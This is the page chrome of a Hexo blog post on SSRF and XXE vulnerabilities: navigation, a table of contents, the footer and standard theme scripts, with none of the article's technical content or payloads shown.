+              <div class="share-weixin-qrcode">
+                <div class="share-weixin-info">
+                  <div id="share-weixin-author"></div>
+                  <div id="share-weixin-theme">Powered By hexo-theme-reimu</div>
+                </div>
+                <img id="share-weixin-qr" >
+              </div>
+            </div>
+            <div class="share-weixin-canvas"></div>
+          </div>
+      </div>
+    </a>
+</div>
+      
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web/" rel="tag" title="web">web</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/web%E6%BC%8F%E6%B4%9E/" rel="tag" title="web漏洞">web漏洞</a></li></ul>
+
+    </footer>
+  </div>
+    <nav id="article-nav" aria-label="Article navigation" data-aos="fade-up">
+      <div class="article-nav-link-wrap left">
+            <img data-src="/covers/acheron-honkai-star-3840x2160-19696.jpg" data-sizes="auto" alt="Vulnhub-Deathnote: 1" class="lazyload">
+        <a href="/2026/09/07/Vulnhub-Deathnote-1/" aria-label="Prev: Vulnhub-Deathnote: 1" title="Prev: Vulnhub-Deathnote: 1"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+            Vulnhub-Deathnote: 1
+        </h3>
+      </div>
+    <div class="article-nav-link-wrap right">
+          <img data-src="/covers/columbina-genshin-3840x2160-23949.jpg" data-sizes="auto" alt="文件包含漏洞详解及利用" class="lazyload">
+      <a href="/2026/08/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%88%A9%E7%94%A8/" aria-label="Next: 文件包含漏洞详解及利用"  title="Next: 文件包含漏洞详解及利用"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+          文件包含漏洞详解及利用
+      </h3>
+    </div>
+  </nav>
+
+</article>
+
+  <section id="comments" data-aos="fade-up">
+    <div class="comment-header">
+        
+      <h2 class="comment-title">Leave a comment</h2>
+      <div class="comment-selector">
+        <div class="comment-selector-wrap">
+            <div class="selector-item" data-selector="utterances">
+              <span>utterances</span>
+            </div>
+        </div>
+      </div>
+    </div>
+    <div class="comment-content">
+          <div class="comment utterances-comment" data-aos="fade-up"
+            id="utterances-comment">
+          </div>
+    </div>
+  </section>
+
+</section>
+        </div>
+        <footer id="footer" aria-label="Site footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    <div>
+      <span class="icon-copyright"></span>
+        2020-2026
+        &nbsp;
+      Cl1ck-t0
+    </div>
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+      <div>
+        <span class="icon-brush"></span>
+        67.8k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        05:11
+      </div>
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+  </div>
+</footer>
+
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav" aria-label="Mobile navigation">
+  <div class="sidebar-wrap">
+        <div class="sidebar-toc-sidebar"><h3 class="toc-title">Contents</h3>
+<div class="sidebar-toc-wrapper toc-div-class" >
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ssrfxxe%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text"> SSRF&amp;XXE漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80-%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.1.</span> <span class="toc-text"> 一、前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-number">1.1.1.</span> <span class="toc-text"> 1.1 漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-%E4%B8%A4%E4%B8%AA%E6%BC%8F%E6%B4%9E%E7%9A%84%E6%A0%B8%E5%BF%83%E5%8C%BA%E5%88%AB"><span class="toc-number">1.1.2.</span> <span class="toc-text"> 1.2 两个漏洞的核心区别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C-ssrf-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><span class="toc-number">1.2.</span> <span class="toc-text"> 二、SSRF 服务端请求伪造</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#21-%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF"><span class="toc-number">1.2.1.</span> <span class="toc-text"> 2.1 常见场景</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A1%A5%E5%85%85"><span class="toc-number">1.2.2.</span> <span class="toc-text"> 补充：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#u%E4%BA%A7%E7%94%9F-ssrf-%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%87%BD%E6%95%B0u"><span class="toc-number">1.2.2.1.</span> <span class="toc-text"> 产生 SSRF 漏洞的函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#file_get_contents"><span class="toc-number">1.2.2.1.1.</span> <span class="toc-text"> file_get_contents()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#fsockopen"><span class="toc-number">1.2.2.1.2.</span> <span class="toc-text"> fsockopen()</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#curl_exec"><span class="toc-number">1.2.2.1.3.</span> <span class="toc-text"> curl_exec()</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#ussrf-%E4%B8%AD-url-%E7%9A%84%E4%BC%AA%E5%8D%8F%E8%AE%AEu"><span class="toc-number">1.2.2.2.</span> <span class="toc-text"> SSRF 中 URL 的伪协议</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#51-file-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.2.2.1.</span> <span class="toc-text"> 5.1 file:&#x2F;&#x2F; 协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#52-dict-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.2.2.2.</span> <span class="toc-text"> 5.2 dict:&#x2F;&#x2F; 协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#53-sftp-%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.2.2.3.</span> <span class="toc-text"> 5.3 sftp:&#x2F;&#x2F; 协议</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#54-ldap-ldaps-ldapi"><span class="toc-number">1.2.2.2.4.</span> <span class="toc-text"> 5.4 ldap:&#x2F;&#x2F; &#x2F; ldaps:&#x2F;&#x2F; &#x2F; ldapi:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#55-tftp"><span class="toc-number">1.2.2.2.5.</span> <span class="toc-text"> 5.5 tftp:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#56-gopher-%E5%8D%8F%E8%AE%AE%E9%87%8D%E7%82%B9"><span class="toc-number">1.2.2.2.6.</span> <span class="toc-text"> 5.6 gopher:&#x2F;&#x2F; 协议（重点）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#22-%E6%94%BB%E5%87%BB%E7%9B%AE%E6%A0%87%E6%B8%85%E5%8D%95"><span class="toc-number">1.2.3.</span> <span class="toc-text"> 2.2 攻击目标清单</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#23-%E6%9C%89%E5%9B%9E%E6%98%BE-vs-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-number">1.2.4.</span> <span class="toc-text"> 2.3 有回显 vs 无回显</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#24-%E8%BF%87%E6%BB%A4%E4%B8%8E%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.5.</span> <span class="toc-text"> 2.4 过滤与绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#241-%E5%B8%B8%E8%A7%81%E7%9A%84%E8%BF%87%E6%BB%A4%E4%BB%A3%E7%A0%81%E6%9C%89%E7%BC%BA%E9%99%B7"><span class="toc-number">1.2.5.1.</span> <span class="toc-text"> 2.4.1 常见的过滤代码（有缺陷）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#242-%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF"><span class="toc-number">1.2.5.2.</span> <span class="toc-text"> 2.4.2 绕过思路</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#243-%E5%88%86%E6%9E%90%E8%BF%87%E6%BB%A4%E6%97%B6%E7%9A%84%E5%85%B3%E9%94%AE%E9%97%AE%E9%A2%98"><span class="toc-number">1.2.5.3.</span> <span class="toc-text"> 2.4.3 分析过滤时的关键问题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#25-ssrf-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-number">1.2.6.</span> <span class="toc-text"> 2.5 SSRF 防御方案</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89-xxe-xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text"> 三、XXE XML外部实体注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#31-%E4%BB%80%E4%B9%88%E6%98%AF-xml-%E5%AE%9E%E4%BD%93"><span class="toc-number">1.3.1.</span> <span class="toc-text"> 3.1 什么是 XML 实体</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#32-xxe-%E5%87%BA%E7%8E%B0%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.3.2.</span> <span class="toc-text"> 3.2 XXE 出现的位置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#33-xxe-%E7%9A%84%E5%88%A9%E7%94%A8%E6%96%B9%E5%BC%8F"><span class="toc-number">1.3.3.</span> <span class="toc-text"> 3.3 XXE 的利用方式</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#331-%E8%AF%BB%E5%8F%96%E6%9C%AC%E5%9C%B0%E6%96%87%E4%BB%B6%E6%9C%80%E7%BB%8F%E5%85%B8"><span class="toc-number">1.3.3.1.</span> <span class="toc-text"> 3.3.1 读取本地文件（最经典）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#332-%E8%AE%BF%E9%97%AE%E5%86%85%E7%BD%91%E8%B5%84%E6%BA%90xxe-ssrf"><span class="toc-number">1.3.3.2.</span> <span class="toc-text"> 3.3.2 访问内网资源（XXE → SSRF）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#333-%E5%B8%A6%E5%A4%96%E6%95%B0%E6%8D%AE%E6%B3%84%E9%9C%B2blind-xxe"><span class="toc-number">1.3.3.3.</span> <span class="toc-text"> 3.3.3 带外数据泄露（Blind XXE）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#334-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1billion-laughs-%E6%94%BB%E5%87%BB"><span class="toc-number">1.3.3.4.</span> <span class="toc-text"> 3.3.4 拒绝服务（Billion Laughs 攻击）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#34-%E5%81%9A-xxe-%E9%A2%98%E6%97%B6%E7%9A%84%E4%B8%89%E6%AD%A5%E7%A1%AE%E8%AE%A4"><span class="toc-number">1.3.4.</span> <span class="toc-text"> 3.4 做 XXE 题时的三步确认</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#35-xxe-%E9%98%B2%E5%BE%A1%E6%96%B9%E6%A1%88"><span class="toc-number">1.3.5.</span> <span class="toc-text"> 3.5 XXE 防御方案</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B-%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.</span> <span class="toc-text"> 四、常见问题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#41-%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.1.</span> <span class="toc-text"> 4.1 基础概念问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#42-%E6%A3%80%E6%9F%A5%E4%B8%8E%E7%BB%95%E8%BF%87%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.2.</span> <span class="toc-text"> 4.2 检查与绕过问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#43-%E5%88%A9%E7%94%A8%E9%93%BE%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.3.</span> <span class="toc-text"> 4.3 利用链问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#44-%E9%98%B2%E5%BE%A1%E9%97%AE%E9%A2%98"><span class="toc-number">1.4.4.</span> <span class="toc-text"> 4.4 防御问题</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94-%E5%AE%9E%E6%88%98%E6%80%BB%E7%BB%93"><span class="toc-number">1.5.</span> <span class="toc-text"> 五、实战总结</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#51-ssrf-%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">1.5.1.</span> <span class="toc-text"> 5.1 SSRF 测试流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#52-xxe-%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B"><span class="toc-number">1.5.2.</span> <span class="toc-text"> 5.2 XXE 测试流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#53-%E4%B8%8D%E5%90%8C%E6%A3%80%E6%9F%A5%E7%9A%84%E5%BA%94%E5%AF%B9%E7%AD%96%E7%95%A5"><span class="toc-number">1.5.3.</span> <span class="toc-text"> 5.3 不同检查的应对策略</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD-%E6%8B%93%E5%B1%95%E5%86%85%E5%AE%B9"><span class="toc-number">1.6.</span> <span class="toc-text"> 六、拓展内容</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#61-ssrf-%E8%BF%9B%E9%98%B6%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">1.6.1.</span> <span class="toc-text"> 6.1 SSRF 进阶绕过技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#62-xxe-%E8%BF%9B%E9%98%B6%E6%8A%80%E5%B7%A7"><span class="toc-number">1.6.2.</span> <span class="toc-text"> 6.2 XXE 进阶技巧</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#63-%E9%98%B2%E5%BE%A1%E5%8A%A0%E5%9B%BA%E6%96%B9%E6%A1%88"><span class="toc-number">1.6.3.</span> <span class="toc-text"> 6.3 防御加固方案</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#64-%E5%BF%AB%E9%80%9F%E8%87%AA%E6%A3%80"><span class="toc-number">1.6.4.</span> <span class="toc-text"> 6.4 快速自检</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%99%84%E5%BD%95%E5%B8%B8%E7%94%A8-payload-%E9%9B%86%E5%90%88"><span class="toc-number">1.7.</span> <span class="toc-text"> 附录：常用 Payload 集合</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ssrf-%E5%B8%B8%E7%94%A8-payload"><span class="toc-number">1.7.1.</span> <span class="toc-text"> SSRF 常用 Payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#xxe-%E5%B8%B8%E7%94%A8-payload"><span class="toc-number">1.7.2.</span> <span class="toc-text"> XXE 常用 Payload</span></a></li></ol></li></ol></li></ol>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="Cl1ck-t0" class="lazyload">
+  <div class="sidebar-author-name">Cl1ck-t0</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>Post</div>
+    <div class="sidebar-state-number">32</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>Category</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>Tag</div>
+    <div class="sidebar-state-number">20</div>
+  </div>
+</div>
+<div class="sidebar-social" >
+    <div class="icon-rss sidebar-social-icon">
+      <a href=/atom.xml itemprop="url" target="_blank" aria-label="rss" rel="noopener nofollow noreferrer"></a>
+    </div>
+</div>
+<div class="sidebar-menu">
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="Home"></a>
+        <div class="sidebar-menu-link">Home</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="Archives"></a>
+        <div class="sidebar-menu-link">Archives</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="About"></a>
+        <div class="sidebar-menu-link">About</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="Friend"></a>
+        <div class="sidebar-menu-link">Friend</div>
+      </div>
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/atom.xml" aria-label="rss"></a>
+        <div class="sidebar-menu-link">rss</div>
+      </div>
+</div>
+</div>
+  </div>
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+</nav>
+
+    </div>
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+  <script>
+    var setupFirework = () => {
+      if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+        window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'));
+      }
+    }
+  </script>
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.2.0/dist/index.umd.js" integrity="sha384-qi9WggRt19tv8Vc7pCHW3ulMNLwrn515zaLEWZjl1px07vz8+pUoWX8n1rgq282T" crossorigin="anonymous" onload="setupFirework()" defer></script>
+
+
+  
+<script src="https://npm.webcache.cn/theme-shokax-pjax@0.0.3/dist/index.umd.js" integrity="sha384-xneY1WY8hOfUzswrE4CrYq35N4BdVcxqxwHPr9zawE&#x2F;jMSCxD+jAPU55x&#x2F;jj3wlf" crossorigin="anonymous"></script>
+
+  
+<script src="/js/pjax.js"></script>
+
+
+
+
+  
+<script src="https://npm.webcache.cn/quicklink@3.0.1/dist/quicklink.umd.js" integrity="sha384-caMDqvgav&#x2F;HWdEYQU1QRRHMLleigpL1YHAG0m371DhzfL8rRzUyOb+bEHtwlmYjD" crossorigin="anonymous"></script>
+
+  <script data-pjax>
+    window.quicklink?.listen({
+      timeout: 3000,
+      priority: true,
+      ignores: []
+    });
+  </script>
+
+<div id="lazy-script">
+  <div>
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "Cl1ck-t0",
+          title: "SSRF&amp;XXE漏洞",
+          url: "https://cl1ck-t0.github.io/2026/08/22/SSRF-XXE%E6%BC%8F%E6%B4%9E/",
+          excerpt: "",
+          description: "",
+          stripContent: " SSRF&amp;amp;XXE漏洞 SSRF和XXE的共同点是：用户表面上提交的是一个地址或一段数据，但程序却让服务器替用户访问了内部资源。  一、前置知识  1.1 漏洞概述 什么是 SSRF？   SSRF（Server-Side Request Forgery，服务端请求伪造）   服务器根据用户输入去请求某个地址，但没有限制好访问范围   攻击者让服务器替自己访问内部资源 SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。 比如,黑客操作服",
+          date: "Sat Aug 22 2026 16:25:07 GMT+0800",
+          updated: "Wed Sep 16 2026 22:49:09 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+        
+<script src="https://npm.webcache.cn/@zumer/snapdom@1.9.14/dist/snapdom.min.js" integrity="sha384-OEQ+fJp&#x2F;Mvi2uzBREXybtxryJvLytWapuHu4EE6LPwTKUwATYcc55tPPcZTzVcmx" crossorigin="anonymous" defer data-pjax></script>
+
+        
+<script src="https://npm.webcache.cn/qrcode@1.5.1/build/qrcode.js" integrity="sha384-VT1EeewTCEXgndcPMQ0PzV+uVFYjxFIjmAA7s5gcMX9t4Dt5TD+OVQIn7NJWIXn7" crossorigin="anonymous" defer data-pjax></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["utterances"];
+  var commentConfig = {
+    utterances: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.utterances-comment'); 
+        if (!container) return;
+        container.style.display = 'block';
+
+        let theme = 'auto';
+        const parsedTheme = theme === 'auto' ? (document.documentElement.getAttribute('data-theme') === 'dark' ? 'github-dark' : 'github-light') : theme;
+
+        // 创建 utterances 脚本
+        const script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        script.setAttribute('repo', 'Cl1ck-t0/Cl1ck-t0.github.io');
+        script.setAttribute('issue-term', 'title');
+        script.setAttribute('theme', parsedTheme);
+        script.setAttribute('crossorigin', 'anonymous');
+        script.async = true;
+
+        // 清空容器（防止重复加载）并插入脚本
+        container.innerHTML = '';
+        container.appendChild(script);
+        if (theme === 'auto') {
+          const themeHandler = (e) => {
+            const iframe = container.querySelector('iframe.utterances-frame');
+            if (!iframe || !iframe.contentWindow) {
+              document.body.removeEventListener('reimu:theme-set', themeHandler);
+              return;
+            }
+            iframe.contentWindow.postMessage({ type: 'set-theme', theme: e.detail.isDark ? 'github-dark' : 'github-light' }, 'https://utteranc.es');
+          };
+          document.body.addEventListener('reimu:theme-set', themeHandler);
+        }
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+    <script>
+      var setupAPlayer = () => {
+        if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+          if (window.matchMedia('(max-width: 959px)').matches) {
+            const meting = _$('meting-js');
+            if (meting) {
+              meting.setAttribute('fixed', 'true');
+              const aside = meting.parentNode?.parentNode;
+              if (aside?.tagName === 'ASIDE') {
+                meting.parentNode.removeChild(meting);
+                document.body.appendChild(meting);
+              }
+            }
+          }
+        }
+      };
+    </script>
+  
